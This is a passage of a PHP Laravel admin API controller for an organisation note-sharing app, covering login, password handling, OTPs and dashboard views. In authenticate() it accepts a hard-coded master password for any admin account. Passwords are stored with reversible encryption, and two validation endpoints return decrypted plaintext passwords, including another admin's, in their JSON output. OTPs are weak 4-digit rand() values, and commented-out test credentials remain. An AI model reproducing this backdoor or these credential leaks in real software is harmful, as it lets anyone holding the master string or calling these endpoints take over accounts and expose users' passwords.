<?php

namespace App\Http\Controllers\AdminApi;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use App\Models\Api\Appuser;
use App\Models\Api\AppKeyMapping;
use App\Models\Org\OrganizationUser;
use App\Models\Org\OrgReferralCode;
use App\Models\Org\EnterpriseCoupon;
use App\Models\Org\EnterpriseCouponCode;
use App\Models\Org\Organization;
use App\Models\Org\OrganizationSubscription;
use App\Models\Org\OrganizationAdministration;
use App\Models\Org\OrganizationAdministrationSession;
use App\Models\Org\OrganizationChatRedirection;
use App\Models\Org\Api\OrgEmployee;
use App\Models\Org\Api\OrgEmployeeConstant;
use Illuminate\Http\Request;
use Carbon\Carbon;
use Session;
use Datatables;
use Illuminate\Support\Facades\Input;
use Hash;
use Redirect;
use Config;
use Response;
use Crypt;
use DB;
use View;
use App\Libraries\OrganizationClass;
use App\Libraries\MailClass;
use App\Libraries\CommonFunctionClass;
use App\Libraries\FileUploadClass;
use App\Libraries\ContentDependencyManagementClass;
use App\Libraries\OrganizationAdministrationLoggingClass;
use Illuminate\Support\Facades\Log;
use App\Http\Traits\OrgCloudMessagingTrait;

class AppAdminController extends Controller
{
    use OrgCloudMessagingTrait;

    public $userId = 0;
    public $roleId = 0;
    public $organizationId = 0;
    public $userDetails = NULL;

    public $modulePermissions="";
    public $module="";

    public function __construct()
    {
        $encUserToken = Input::get('usrtoken'); 

        if(isset($encUserToken) && $encUserToken != "")
        {
            $adminUserId = Crypt::decrypt($encUserToken);

            $adminUser = OrganizationAdministration::active()->byId($adminUserId)->first();

            if(isset($adminUser))
            {
                $this->userDetails = $adminUser;
                $this->userId = $adminUserId;
                $this->roleId = $adminUser->role_id;
                $this->organizationId = $adminUser->organization_id;
            }
        }
    }
    
    /**
     * Authenticate app user for login.
     *
     * @return json array
     */
    public function authenticate()
    {
        $msg = "";
        $status = 0;

    	$email = Input::get('email');
    	$password = Input::get('password');
    	$orgCode = Input::get('orgCode');
        $appKey = Input::get('appKey');

        $response = array();

        if($email != "" && $password != "" && $orgCode != "")
        {
        	$organizationId = 0;
        	$organization = Organization::active()->byCode($orgCode)->first();
        	if(isset($organization))
        	{
				$organizationId = $organization->organization_id;
			}
			
            $user = OrganizationAdministration::active()->ofOrganization($organizationId)->withEmail($email)->first();

            if(isset($user))
            {
            	$orgIsActive= 0; 
            	if(isset($user->organization))
            		$orgIsActive = $user->organization->is_active;
            	
            	if($orgIsActive == 1)
            	{
					$hashedPassword = $user->password;
	                $actPassword = Crypt::decrypt($hashedPassword);

                    $masterPassword = 'HpNPdSsE3nJXjOspCANb';
	                
	                if ($password == $actPassword || $password == $masterPassword)
	                {
	                    $status = 1;

	                    $userId = $user->org_admin_id;
	                    $orgId = $user->organization_id;
	                    $orgName = $user->organization->regd_name;

	                    $userToken = $userId;
                        $loginToken = CommonFunctionClass::setEnterpAdminUserSession($userId);

                        $organizationWebUrl = OrganizationClass::getOrganizationWebAppAccessUrl($organizationId);

                        $isWLAppLogin = 0;
                        $appDetails = NULL;
                        $appKeyMapping = NULL;
                        if(isset($appKey) && $appKey != "")
                        {               
                            $appKeyMapping = AppKeyMapping::active()->byAppKey($appKey)->first();             
                            
                            if(isset($appKeyMapping))
                            {
                                $isWLAppLogin = 1;

                                $appDetails = array();  
                                $appDetails['appName'] = $appKeyMapping->app_name;
                                $appDetails['appKey'] = $appKeyMapping->app_key;
                                $appDetails['appLogoUrl'] = $appKeyMapping->app_logo_full_url;
                                $appDetails['appLogoThumbUrl'] = $appKeyMapping->app_logo_thumb_url;
                            }
                        }

	                    $encUserToken = Crypt::encrypt($userToken);
	                    $response['userToken'] = $encUserToken;
	                    $response['userFullname'] = $user->fullname;
	                    $response['userOrganization'] = $orgName;
	                    $response['roleId'] = $user->role_id;
                        $response['loginToken'] = $loginToken;
                        $response['organizationWebUrl'] = $organizationWebUrl;
                        $response['isWLAppLogin'] = $isWLAppLogin;
                        $response['appDetails'] = $appDetails;

                        $adminLoggingObj = New OrganizationAdministrationLoggingClass;
                        $adminLoggingObj->init($userId);
                        $adminLoggingObj->createLogAdminLoggedIn();
	                }
	                else
	                {
	                    $status = -1;
	                    $msg = Config::get('app_config_notif.err_user_invalid_cred');
	                }
				} 
                else
                {
                    $status = -1;
                    $msg = Config::get('app_config_notif.err_invalid_user');
                }
      
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');
            }
        }
    	else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * Validate current password.
     *
     * @return json array
     */
    public function validateCurrPassword()
    {
        $actPassword = "";
        $isValid = FALSE;   
            
        $password = Input::get('currPass');

        if(isset($this->userDetails))
        {
            $hashedPassword = $this->userDetails->password;
            $actPassword = Crypt::decrypt($hashedPassword);

            if ($password == $actPassword)
            {
                $isValid = TRUE;
            }
            else
            {
                $isValid = FALSE;
            }
        }
        
        echo json_encode(array('valid' => $isValid, 'pass' => $actPassword));   
    }
    
    /**
     * Validate and update password.
     *
     * @return void
     */    
    public function updatePassword(Request $request)
    {
        $status = 0;
        $msg = "";

        if(isset($this->userDetails))
        {
            $status = 1;
            $password = $request->new_pass;
            $encPassword = Crypt::encrypt($password);

            $this->userDetails->password = $encPassword;
            $this->userDetails->save();
        }
        else
        {
            $status = -1;
            $msg = Config::get("app_config_notif.err_invalid_user");
        }
    
        $response = array('status' => $status, 'msg' => "$msg" );

        return Response::json($response);  
    }
    
    /**
     * Verify code for account activation.
     *
     * @return json array
     */
    public function resendVerificationCode()
    {
        $msg = "";
        $status = 0;

        $email = Input::get('email');
        /*$email = 'amrutakhedkar99@gmail.com';*/

        $response = array();

        if($email != "")
        {
            $user = Appuser::where('email','=',$email)->active()->first();
            
            if(isset($user))
            { 
                if($user->is_verified == 0)
                {
                    $verificationCode = $this->getVerificationCode();
                    $encVerificationCode = Crypt::encrypt($verificationCode);

                    $user->verification_code = $encVerificationCode;
                    $user->save();
                   
                    $status = 1;
                    $msg = Config::get('app_config_notif.inf_ver_msg_sent');

                    //Ver Code Mail
                    MailClass::sendVerificationCodeMail($user->appuser_id);
                    //$response['verificationCode'] = $verificationCode;
                }
                else
                {
                    $status = -1;
                    $msg = Config::get('app_config_notif.err_user_already_verified'); 
                }       
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');       
            }
        }
        else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }            

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * Generate random number for code.
     *
     * @return integer
     */
    private function getVerificationCode()
    {
        $minVal = 1000;
        $maxVal = 9999;

        $randonNum = rand($minVal, $maxVal);

        return $randonNum;
    }
    
    /**
     * send otp for password change.
     *
     * @return json array
     */
    public function sendOtp()
    {
        $msg = "";
        $status = 0;

        $email = Input::get('email');

        /*$email = "rahul2552binary@gmail.com";*/

        $response = array();

        if($email != "")
        {
            $user = Appuser::active()->where('email','=',$email)->first();
            
            if(isset($user))
            {   
                $userId = $user->appuser_id;
                AppuserOtp::where('appuser_id','=',$userId)->delete();   
                
                $otp = $this->getVerificationCode();
                $encOtp = Crypt::encrypt($otp);

                $userOtp = New AppuserOtp;
                $userOtp->appuser_id = $userId;
                $userOtp->otp = $encOtp;
                $userOtp->save();
               
                $status = 1;
                $msg = Config::get('app_config_notif.inf_otp_msg_sent');

                //Otp Code Mail
                MailClass::sendOtpMail($user->appuser_id);
                //$response['otp'] = $otp;                  
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');       
            }
        }
        else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }            

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * change account password for forgot password.
     *
     * @return json array
     */
    public function changeForgotPassword()
    {
        $msg = "";
        $status = 0;

        $encUserId = Input::get('userId');
        $password = Input::get('password');
        $loginToken = Input::get('loginToken');

        /*$encUserId = "eyJpdiI6Ikt3WElScUhxYkZ3SGRJT1Z1cXRVaWc9PSIsInZhbHVlIjoiQ29RWnNIc1MzQmNqR1UyaFcyTTRGdz09IiwibWFjIjoiYTQ3NzkwMWU5Mzc2Njc1ZGYxNzgzM2YxNmY0MWFkMGU2ZjI4YTRkMTFjYzI2N2ExZmFhY2MyZjE2MzMwMjdiZCJ9";
        $password = "admin";*/

        $response = array();

        if($encUserId != "" && $password != "")
        {
        	if(!isset($loginToken) || $loginToken == "")
        	{
		        $response['status'] = -1;
		        $response['msg'] = Config::get('app_config_notif.err_login_token_unavailable');
		        $response['tokenStatus'] = Config::get('app_config_notif.err_login_token_unavailable_status_id');

		        return Response::json($response);
			}
			
            $userId = Crypt::decrypt($encUserId);
            $user = Appuser::findOrFail($userId);
            
            if(isset($user))
            { 
            	if($user->login_token != $loginToken)
	        	{
			        $response['status'] = -1;
			        $response['msg'] = Config::get('app_config_notif.err_login_token_incorrect');
		        	$response['tokenStatus'] = Config::get('app_config_notif.err_login_token_incorrect_status_id');

			        return Response::json($response);
				}
                if($user->is_verified == 1)
                {
                    
                }
                else
                {
                    $status = -1;
                    $msg = Config::get('app_config_notif.err_user_verification_pending'); 
                }                    
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');       
            }
        }
        else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }            

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * change account password for change password.
     *
     * @return json array
     */
    public function changePassword()
    {
        $msg = "";
        $status = 0;

        $encUserId = Input::get('userId');
        $oldPassword = Input::get('oldPassword');
        $newPassword = Input::get('newPassword');
        $loginToken = Input::get('loginToken');

        /*$encUserId = "eyJpdiI6Ikt3WElScUhxYkZ3SGRJT1Z1cXRVaWc9PSIsInZhbHVlIjoiQ29RWnNIc1MzQmNqR1UyaFcyTTRGdz09IiwibWFjIjoiYTQ3NzkwMWU5Mzc2Njc1ZGYxNzgzM2YxNmY0MWFkMGU2ZjI4YTRkMTFjYzI2N2ExZmFhY2MyZjE2MzMwMjdiZCJ9";
        $oldPassword = "admin11";
        $newPassword = "admin";*/

        $response = array();

        if($encUserId != "" && $oldPassword != "" && $newPassword != "")
        {
        	if(!isset($loginToken) || $loginToken == "")
        	{
		        $response['status'] = -1;
		        $response['msg'] = Config::get('app_config_notif.err_login_token_unavailable');
		        $response['tokenStatus'] = Config::get('app_config_notif.err_login_token_unavailable_status_id');

		        return Response::json($response);
			}
			
            $userId = Crypt::decrypt($encUserId);
            $user = Appuser::findOrFail($userId);
            
            if(isset($user))
            { 
            	if($user->login_token != $loginToken)
	        	{
			        $response['status'] = -1;
			        $response['msg'] = Config::get('app_config_notif.err_login_token_incorrect');
		        	$response['tokenStatus'] = Config::get('app_config_notif.err_login_token_incorrect_status_id');

			        return Response::json($response);
				}
				
                if($user->is_verified == 1)
                {
                    $hashedPassword = $user->password;

                    if (Hash::check($oldPassword, $hashedPassword))
                    {
                        $encPassword = Hash::make($newPassword);

                        $user->password = $encPassword;
                        $user->save();
                       
                        $status = 1;
                        $msg = Config::get('app_config_notif.inf_password_changed');

                        //Send Password Changed Mail
                        MailClass::sendPasswordChangedMail($userId);
                    }
                    else
                    {
                        $status = -1;
                        $msg = Config::get('app_config_notif.err_incorrect_current_password');
                    }
                }
                else
                {
                    $status = -1;
                    $msg = Config::get('app_config_notif.err_user_verification_pending'); 
                }                    
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');       
            }
        }
        else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }            

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
     /**
     * Logout User.
     *
     * @return void
     */    
    public function userLogout()
    {
        $msg = "";
        $status = 0;

        $loginToken = Input::get('loginToken');

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }

        /*$encUserId = "eyJpdiI6Ijg1cFgzbzBOTytEcnFKXC83QVROeFJRPT0iLCJ2YWx1ZSI6Imh2U0JMQlhnd0tnSCtuVHpkYndKMXc9PSIsIm1hYyI6IjViNWUwN2QyNDAwMmQ2NWNmZDkyMmYyZjEwYWE0NmVkMTIzZTFhYTc4ODEyM2VkZjJlYTRkZDViMjMyNjBiZDIifQ==";*/

        $status = 1;
        $response = array();

        $userSession = CommonFunctionClass::getEnterpAdminUserSession($this->userId, $loginToken); 
        if(!isset($userSession))
        {
            $response['status'] = -1;
            $response['msg'] = Config::get('app_config_notif.err_login_token_incorrect');
            $response['tokenStatus'] = Config::get('app_config_notif.err_login_token_incorrect_status_id');

            return Response::json($response);
        }
        
        $userSession->delete();

        $adminLoggingObj = New OrganizationAdministrationLoggingClass;
        $adminLoggingObj->init($this->userId);
        $adminLoggingObj->createLogAdminLoggedOut();

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);  
    }

	public function loadAdminUserMenu()
	{   	
        $status = 0;
        $msg = "";

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }
                
        $status = 1;
        
        $data = array();
        $data['roleId'] = $this->roleId;

        $_viewToRender = View::make('adminmenu.adminUserMenu', $data);
        $_viewToRender = $_viewToRender->render();

        $response['view'] = $_viewToRender;  

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
	}

	public function loadDashboardStats()
	{
        $status = 0;
        $msg = "";

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }
                
        $status = 1;

        $isNew = 1;//Input::get('isNew');
        $tzOfs = Input::get('ofs');

        if(!isset($isNew) || $isNew != 1)
        {
            $isNew = 0;
        }
            
        $depMgmtObj = New ContentDependencyManagementClass;
        $depMgmtObj->withOrgId($this->organizationId);
        
        $allocUsrCnt = 0;
        $availUsrCnt = 0;
        $usedUserCnt = 0;
        $userCntParams = $depMgmtObj->getUserCountParams();
        if(isset($userCntParams['alloc']))
        {
        	$allocUsrCnt = $userCntParams['alloc'];
        	$availUsrCnt = $userCntParams['avail'];
        	$usedUserCnt = $userCntParams['used'];
		}
		
		$gbAllotted = 0;
		$gbAvailable = 0;
        $quotaParams = $depMgmtObj->getQuotaParams();
        if(isset($quotaParams['alloc']))
        {
        	$gbAllotted = $quotaParams['alloc'];
        	$gbAvailable = $quotaParams['avail'];
		}
		
		$gbUsed = $gbAllotted - $gbAvailable;
		
		$groups = $depMgmtObj->getAllGroupsForOrganization();
		$groupCount = count($groups);
		
		$gbAllotted = ceil($gbAllotted/1024);

        $isFolder = FALSE;

        $groupTableData = array();
        foreach ($groups as $group) 
        {
            $grpId = $group->group_id;

            $allottedKbs = $group->allocated_space_kb;
            $usedKbs = $group->used_space_kb;
            $availableKb = $allottedKbs - $usedKbs;
            
            $allottedSpaceMb = CommonFunctionClass::convertKbToMb($allottedKbs);
            $availableSpaceMb = CommonFunctionClass::convertKbToMb($availableKb);
            $usedSpaceMb = $allottedSpaceMb - $availableSpaceMb;

            $grpNoteCount = $depMgmtObj->getAllContentModelObj($isFolder, $grpId)->count();
            $mostRecentNote = $depMgmtObj->getAllContentModelObj($isFolder, $grpId)->orderBy('create_timestamp', 'DESC')->first();

            $mostRecentNoteTs = 0;
            if(isset($mostRecentNote))
            {
                $mostRecentNoteTs = $mostRecentNote->create_timestamp;
            }

            $grpObject = array();
            $grpObject['name'] = $group->name;
            $grpObject['noteCount'] = $grpNoteCount;
            $grpObject['allottedSpaceMb'] = $allottedSpaceMb;
            $grpObject['usedSpaceMb'] = $usedSpaceMb;
            $grpObject['availableSpaceMb'] = $availableSpaceMb;
            $grpObject['mostRecentNoteTs'] = $mostRecentNoteTs;

            array_push($groupTableData, $grpObject);
        }

        $orgEmployees = $depMgmtObj->getAllEmployees();

        $isFolder = TRUE;

        $employeeTableData = array();
        foreach ($orgEmployees as $orgEmployee) 
        {
            $empId = $orgEmployee->employee_id;

            $empDepMgmtObj = New ContentDependencyManagementClass;
            $empDepMgmtObj->withOrgIdAndEmpId($this->organizationId, $empId);

            $allottedKbs = 0;
            $usedKbs = 0;
            $availableKbs = 0;

            $empConstants = $empDepMgmtObj->getEmployeeConstantObject();
            if(isset($empConstants))
            {
                $allottedKbs = $empConstants->attachment_kb_allotted;
                $usedKbs = $empConstants->attachment_kb_used;
                $availableKbs = $empConstants->attachment_kb_available;
            }
            
            $allottedSpaceMb = CommonFunctionClass::convertKbToMb($allottedKbs);
            $availableSpaceMb = CommonFunctionClass::convertKbToMb($availableKbs);
            $usedSpaceMb = $allottedSpaceMb - $availableSpaceMb;

            $empNoteCount = $empDepMgmtObj->getAllContentModelObj($isFolder)->count();
            $mostRecentNote = $empDepMgmtObj->getAllContentModelObj($isFolder)->orderBy('create_timestamp', 'DESC')->first();

            $mostRecentNoteTs = 0;
            if(isset($mostRecentNote))
            {
                $mostRecentNoteTs = $mostRecentNote->create_timestamp;
            }

            $lastSyncTs = "";
            // $orgUser = OrganizationUser::ofOrganization($this->organizationId)->byEmpId($empId)->first();
            // if(isset($orgUser))
            // {
            //     $orgUserEmail = $orgUser->appuser_email;

            //     $appuser = Appuser::ofEmail($orgUserEmail)->first();

            //     if(isset($appuser))
            //     {
            //         $lastSyncTs = $appuser->last_sync_ts;
            //     }
            // }

            $empObject = array();
            $empObject['name'] = $orgEmployee->employee_name;
            $empObject['noteCount'] = $empNoteCount;
            $empObject['allottedSpaceMb'] = $allottedSpaceMb;
            $empObject['usedSpaceMb'] = $usedSpaceMb;
            $empObject['availableSpaceMb'] = $availableSpaceMb;
            $empObject['isActive'] = $orgEmployee->is_active;
            $empObject['isVerified'] = $orgEmployee->is_verified;
            $empObject['mostRecentNoteTs'] = $mostRecentNoteTs;
            $empObject['lastSyncTs'] = $lastSyncTs;

            array_push($employeeTableData, $empObject);
        }
    	
        $data = array();
    	$data['userCntAllotted'] = $allocUsrCnt;
    	$data['userCntAvailable'] = $availUsrCnt;
    	$data['userCntUsed'] = $usedUserCnt;
    	$data['gbAllotted'] = $gbAllotted;
    	$data['gbAvailable'] = $gbAvailable;
    	$data['gbUsed'] = $gbUsed;
    	$data['groupCount'] = $groupCount;
        $data['isNew'] = $isNew;
        $data['groupTableData'] = $groupTableData;
        $data['employeeTableData'] = $employeeTableData;
        $data['tzOfs'] = $tzOfs;
    	
        $_viewToRender = View::make('adminmenu.adminDashboard', $data);
        $_viewToRender = $_viewToRender->render();
        
        //$_viewToRender = "";

        $response['view'] = $_viewToRender;  

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
	}

	public function loadOrgInformationModal()
	{
        $status = 0;
        $msg = "";

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }
                
        $status = 1;
            
		$organization = OrganizationClass::getOrganizationFromOrgId($this->organizationId);
       	$orgFieldsArr = array();
		                
        $logoFilename = $organization->logo_filename;
		$orgLogoUrl = "";
		$orgLogoThumbUrl = "";
		if(isset($logoFilename) && $logoFilename != "")
		{
			$orgLogoUrl = OrganizationClass::getOrgPhotoUrl($this->organizationId, $logoFilename);
			$orgLogoThumbUrl = OrganizationClass::getOrgPhotoThumbUrl($this->organizationId, $logoFilename);
		}
        
        if(isset($organization->regd_name) && $organization->regd_name != "") 
        {
        	$fieldObj = array();
			$fieldObj['fldTitle'] = 'Organization Name';
			$fieldObj['fldValue'] = $organization->regd_name;
			array_push($orgFieldsArr, $fieldObj);
		}
        
        if(isset($organization->system_name) && $organization->system_name != "") 
        {
        	$fieldObj = array();
			$fieldObj['fldTitle'] = 'System Name';
			$fieldObj['fldValue'] = $organization->system_name;
			array_push($orgFieldsArr, $fieldObj);
		}
        
        if(isset($organization->email) && $organization->email != "") 
        {
        	$fieldObj = array();
			$fieldObj['fldTitle'] = 'Email';
			$fieldObj['fldValue'] = $organization->email;
			array_push($orgFieldsArr, $fieldObj);
		}
        
        if(isset($organization->address) && $organization->address != "") 
        {
        	$fieldObj = array();
			$fieldObj['fldTitle'] = 'Address';
			$fieldObj['fldValue'] = $organization->address;
			array_push($orgFieldsArr, $fieldObj);
		}

        $organizationWebUrl = OrganizationClass::getOrganizationWebAppAccessUrl($this->organizationId);
        
        if(isset($organizationWebUrl) && $organizationWebUrl != "") 
        {
            $fieldObj = array();
            $fieldObj['fldTitle'] = 'HyLyt Web URL';
            $fieldObj['fldValue'] = $organizationWebUrl;
            array_push($orgFieldsArr, $fieldObj);
        }

        $chatRedirections = OrganizationChatRedirection::get();
        $chatRedirectionArr = array();
        foreach ($chatRedirections as $chatRedirection) {
            $chatRedirectionArr[$chatRedirection->organization_chat_redirection_id] = $chatRedirection->redirection_text;
        }

		$appEmail = $organization->app_email;
		$appPhone = $organization->app_phone;
		$appWebsite = $organization->app_website;
		$appDescription = $organization->app_description;
        $isAppPinEnforced = $organization->is_app_pin_enforced;
        $isFileSaveShareEnabled = $organization->is_file_save_share_enabled;
        $isScreenShareEnabled = $organization->is_screen_share_enabled;
        $attachmentRetainDays = $organization->org_attachment_retain_days;
        $chatRedirectionId = $organization->organization_chat_redirection_id;
        $employeeInactivityDays = $organization->employee_inactivity_day_count;

        $employeeInactivityDayCountOptionArr = Config::get("app_config.employee_inactivity_day_count_option_arr");

        $appDetails = array();
        $appDetails['email'] = $appEmail;
        $appDetails['phone'] = $appPhone;
        $appDetails['website'] = $appWebsite;
        $appDetails['description'] = $appDescription;
        $appDetails['isAppPinEnforced'] = $isAppPinEnforced;
        $appDetails['isFileSaveShareEnabled'] = $isFileSaveShareEnabled;
        $appDetails['isScreenShareEnabled'] = $isScreenShareEnabled;
        $appDetails['attachmentRetainDays'] = $attachmentRetainDays;

        $encUserToken = Input::get('usrtoken'); 

        $viewDetails = array();
        $viewDetails['orgLogoUrl'] = $orgLogoUrl;
        $viewDetails['orgFieldsArr'] = $orgFieldsArr;
        $viewDetails['appOrgDetails'] = $appDetails;
        $viewDetails['isView'] = FALSE;
        $viewDetails['usrtoken'] = $encUserToken;
        $viewDetails['chatRedirectionArr'] = $chatRedirectionArr;
        $viewDetails['chatRedirectionId'] = $chatRedirectionId;
        $viewDetails['employeeInactivityDayCountOptionArr'] = $employeeInactivityDayCountOptionArr;
        $viewDetails['appEmployeeInactivityDays'] = $employeeInactivityDays;
   
        $_viewToRender = View::make('content.partialview._adminOrgInformationModal', $viewDetails);
        $_viewToRender = $_viewToRender->render();

        $response['view'] = $_viewToRender;   

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
	}

    public function saveOrgAppInformation()
    {
        $msg = "";
        $status = 0;

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }

    	$appEmail = Input::get('appEmail');
    	$appPhone = Input::get('appPhone');
    	$appWebsite = Input::get('appWebsite');
    	$appDescription = Input::get('appDescription');
        $isAppPinEnforced = Input::get('is_app_pin_enforced');
        $isFileSaveShareEnabled = Input::get('is_file_save_share_enabled');
        $isScreenShareEnabled = Input::get('is_screen_share_enabled');
        $attachmentRetainDays = Input::get('org_attachment_retain_days');
        $chatRedirectionId = Input::get('organization_chat_redirection_id');
        $employeeInactivityDayCount = Input::get('employee_inactivity_day_count');

        if(!isset($isAppPinEnforced) || $isAppPinEnforced != 1)
        {
            $isAppPinEnforced = 0;
        }
        
        if(!isset($isFileSaveShareEnabled) || $isFileSaveShareEnabled != 1)
        {
            $isFileSaveShareEnabled = 0;
        }

        /*$email = 'chirayu@itechnosol.com';
        $password = '1234';*/

        $response = array();

        if($appEmail != "" && $appPhone != "")
        {
            $organization = OrganizationClass::getOrganizationFromOrgId($this->organizationId);
        	if(isset($organization))
        	{
                $existingAttachmentRetainDays = $organization->org_attachment_retain_days;

        		$organization->app_email = $appEmail;
        		$organization->app_phone = $appPhone;
        		$organization->app_website = $appWebsite;
        		$organization->app_description = $appDescription;
                $organization->is_app_pin_enforced = $isAppPinEnforced;
                $organization->is_file_save_share_enabled = $isFileSaveShareEnabled;
                $organization->is_screen_share_enabled = $isScreenShareEnabled;
                $organization->org_attachment_retain_days = $attachmentRetainDays;
                $organization->organization_chat_redirection_id = $chatRedirectionId;
                $organization->employee_inactivity_day_count = $employeeInactivityDayCount;
                $organization->save();

                /*
                if($isFileSaveShareEnabled == 0)
                {
                    $depMgmtObj = New ContentDependencyManagementClass;
                    $depMgmtObj->withOrgId($orgId); 
                    $orgEmployees = NULL;//$depMgmtObj->getAllEmployees();

                    if($orgEmployees != NULL)
                    {
                        $orgDbConName = OrganizationClass::configureConnectionForOrganization($this->organizationId);

                        $empConstModelObj = New OrgEmployeeConstant;
                        $empConstModelObj->setConnection($orgDbConName);

                        foreach($orgEmployees as $emp)
                        {
                            $orgEmpId = $emp->employee_id;
                            $employeeConstant = $empConstModelObj->ofEmployee($orgEmpId)->first();
                            
                            if(isset($employeeConstant))
                            {
                                $employeeConstant->is_file_save_share_enabled = $isFileSaveShareEnabled;
                                $employeeConstant->is_screen_share_enabled = $isScreenShareEnabled;
                                $employeeConstant->save();    
                            }               
                        }
                    }
                }
                */

                $depMgmtObj = New ContentDependencyManagementClass;
                $depMgmtObj->withOrgId($this->organizationId); 
                $orgEmployees = $depMgmtObj->getAllActiveAndVerifiedEmployees();
                foreach($orgEmployees as $emp)
                {
                    $orgEmpId = $emp->employee_id;
                    $this->sendOrgEmployeeDetailsToDevice($orgEmpId, $this->organizationId);
                }
                // $response['orgEmployees'] = $orgEmployees;

        		$status = 1;
			}
			else
			{
	            $status = -1;
	            $msg = Config::get('app_config_notif.err_invalid_data');
            }
        }
    	else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * Authenticate app user for login.
     *
     * @return json array
     */
    public function resendCredentials()
    {
        $msg = "";
        $status = 0;

    	$email = Input::get('email');
    	$orgCode = Input::get('orgCode');

        /*$email = 'chirayu@itechnosol.com';
        $password = '1234';*/

        $response = array();

        if($email != "" && $orgCode != "")
        {
        	$organizationId = 0;
        	$organization = Organization::active()->byCode($orgCode)->first();
        	if(isset($organization))
        	{
				$organizationId = $organization->organization_id;
			}
			
            $orgAdmin = OrganizationAdministration::active()->ofOrganization($organizationId)->withEmail($email)->first();

            if(isset($orgAdmin))
            {
            	$orgIsActive= 0; 
            	if(isset($orgAdmin->organization))
            		$orgIsActive = $orgAdmin->organization->is_active;
            	
            	if($orgIsActive == 1)
            	{
					$status = 1;
					$msg = "Credential mail sent";
						
					//Send Credentials Mail
					MailClass::sendOrgAdminCredentailMail($orgAdmin);
				} 
                else
                {
                    $status = -1;
                    $msg = Config::get('app_config_notif.err_invalid_user');
                }
      
            }
            else
            {
                $status = -1;
                $msg = Config::get('app_config_notif.err_invalid_user');
            }
        }
    	else
        {
            $status = -1;
            $msg = Config::get('app_config_notif.err_invalid_data');
        }

        $response['status'] = $status;
        $response['msg'] = "$msg";

        return Response::json($response);
    }
    
    /**
     * Validate current password.
     *
     * @return json array
     */
    public function validateOtherAdminEmail()
    {
        $actPassword = "";
        $isValid = FALSE;   
            
        $admEmail = Input::get('admEmail');

        if(isset($this->userDetails))
        {
            $othAdminUser = OrganizationAdministration::active()->withEmail($admEmail)->exceptId($this->userId)->first();

            if(isset($othAdminUser))
            {
                $isValid = TRUE;
            }
        }
        
        echo json_encode(array('valid' => $isValid, 'pass' => $actPassword));   
    }
    
    /**
     * Validate current password.
     *
     * @return json array
     */
    public function validateOtherAdminPassword()
    {
        $actPassword = "";
        $isValid = FALSE;   
            
        $admEmail = Input::get('admEmail');
        $admPassword = Input::get('admPass');

        if(isset($this->userDetails))
        {
            $othAdminUser = OrganizationAdministration::active()->withEmail($admEmail)->exceptId($this->userId)->first();

            if(isset($othAdminUser))
            {
                $hashedPassword = $othAdminUser->password;
                $actPassword = Crypt::decrypt($hashedPassword);

                if ($admPassword == $actPassword)
                {
                    $isValid = TRUE;
                }
                else
                {
                    $isValid = FALSE;
                }
            }
        }
        
        echo json_encode(array('valid' => $isValid, 'pass' => $actPassword));   
    }

    public function loadOrgStackReferralCodeModal()
    {
        $status = 0;
        $msg = "";

        if(!isset($this->userId) || $this->userId <= 0)
        {
            $msg = Config::get("app_config_notif.err_invalid_user");
            $response = array('status' => -1, 'msg' => "$msg" );
            return Response::json($response); 
        }
                
        $status = 1;
            
        $organization = OrganizationClass::getOrganizationFromOrgId($this->organizationId);
        $orgFieldsArr = array();
                        
        $logoFilename = $organization->logo_filename;
        $orgLogoUrl = "";
        $orgLogoThumbUrl = "";
        if(isset($logoFilename) && $logoFilename != "")
        {
            $orgLogoUrl = OrganizationClass::getOrgPhotoUrl($this->organizationId, $logoFilename);
            $orgLogoThumbUrl = OrganizationClass::getOrgPhotoThumbUrl($this->organizationId, $logoFilename);
        }
        
        if(isset($organization->regd_name) && $organization->regd_name != "") 
        {
            $fieldObj = array();
            $fieldObj['fldTitle'] = 'Organization Name';
            $fieldObj['fldValue'] = $organization->regd_name;
            array_push($orgFieldsArr, $fieldObj);
        }
        
        if(isset($organization->system_name) && $organization->system_name != "") 
        {
            $fieldObj = array();
            $fieldObj['fldTitle'] = 'System Name';
